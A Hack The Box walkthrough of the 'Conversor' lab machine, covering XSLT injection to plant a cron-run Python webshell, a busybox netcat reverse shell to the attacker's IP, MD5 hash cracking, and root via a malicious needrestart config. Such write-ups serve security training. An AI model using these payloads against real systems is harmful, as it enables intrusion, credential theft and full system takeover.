# Conversor — Hack The Box

![Conversor](../images/Conversor.png)

**Machine:** Conversor  
**Difficulty:** Medium  
**OS:** Linux  
**IP:** 10.10.11.92  
**Date:** 2025-10-31  
**Tags:** XSLT Injection, File Upload, Cron Jobs, Privilege Escalation

---

## Summary

Conversor is a medium Linux box exploiting an XSLT injection in a file conversion web app.  
The attacker writes a Python cron webshell for RCE, extracts credentials from a weakly hashed database, and escalates privileges via `sudo needrestart`.

**Attack Path:**  
Web enumeration → XSLT injection → Cron-executed webshell → SSH credentials → needrestart → root.

---

## Recon

### Nmap

```bash
nmap -sC -sV -p- --min-rate=5000 -T5 10.10.11.92 -oN nmap_scan.txt
```

```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache 2.4.52
```

* Hostname: `conversor.htb`
* Web app on port 80, login form at `/`.

```bash
echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts
```

---

## Source Code Discovery

`/about` revealed a downloadable `source.tar`.
Extracted files showed:

* `app.py` (Flask app)
* `instance/users.db` (SQLite)
* `scripts/` (executed by cron)
* `install.md` (paths + cron info)

Cron job:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

---

## Exploitation

### XSLT Injection → File Write

The XSLT processor allowed EXSLT extensions, enabling arbitrary file writes.

Payload (`webshell.xslt`) writes `shell.py` to `/var/www/conversor.htb/scripts/`:

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:exsl="http://exslt.org/common"
extension-element-prefixes="exsl" version="1.0">
<xsl:template match="/">
<exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text"><![CDATA[
#!/usr/bin/env python3
import os, subprocess, traceback
CMD="/var/www/conversor.htb/static/cmd.txt"
OUT="/var/www/conversor.htb/static/out.txt"
try:
    if os.path.exists(CMD):
        cmd=open(CMD).read().strip()
        if cmd:
            out=subprocess.getoutput(cmd)
            open(OUT,"w").write(out)
            open(CMD,"w").close()
except Exception as e:
    open(OUT,"w").write(str(e))
]]></exsl:document>
</xsl:template></xsl:stylesheet>
```

Uploaded both XML and XSLT. Cron executed in ~1 min.

---

### Verify RCE

Write command to `cmd.txt` via another XSLT:

```xml
<exsl:document href="/var/www/conversor.htb/static/cmd.txt" method="text"><![CDATA[id]]></exsl:document>
```

Check output:

```bash
curl http://conversor.htb/static/out.txt
```

```
uid=33(www-data) gid=33(www-data)
```

RCE confirmed.

---

### Reverse Shell

Write reverse shell command:

```xml
<exsl:document href="/var/www/conversor.htb/static/cmd.txt" method="text"><![CDATA[busybox nc 10.10.14.114 443 -e bash]]></exsl:document>
```

Start listener:

```bash
nc -lvnp 443
```

Shell received as `www-data`.

---

## Lateral Movement

### Credential Dump

```bash
strings /var/www/conversor.htb/instance/users.db
```

Found:

```
fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
```

Cracked MD5 → `Keepmesafeandwarm`

SSH:

```bash
ssh fismathack@10.10.11.92
```

User flag: `HTB{redacted}`

---

## Privilege Escalation

### Sudo Permissions

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/sbin/needrestart
```

Exploit with malicious config:

```bash
echo 'system("chmod +s /bin/bash");' > root.sh
sudo /usr/sbin/needrestart -c root.sh
```

Now `/bin/bash` has SUID bit.

Root shell:

```bash
/bin/bash -p
id
# euid=0(root)
```

Root flag: `HTB{redacted}`

---

## Summary of Exploits

| Stage | Vulnerability      | Result     |
| ----- | ------------------ | ---------- |
| 1     | XSLT Injection     | File write |
| 2     | Cron Job Execution | RCE        |
| 3     | Weak MD5 Hash      | User creds |
| 4     | Sudo needrestart   | Root       |

---

## Fix Recommendations

1. Disable EXSLT and restrict output file paths.
2. Use salted password hashing (bcrypt or Argon2).
3. Remove unnecessary cron tasks.
4. Audit sudo rules, avoid granting `needrestart` to users.

---

## Tools

`nmap`, `curl`, `sqlite3`, `netcat`, `hashcat`, `ffuf`

---

**Author:** Erviano Florentino Susanto
**Platform:** Hack The Box
**Date:** 2025-10-31
**Flags:** User HTB{redacted}, Root HTB{redacted}

---
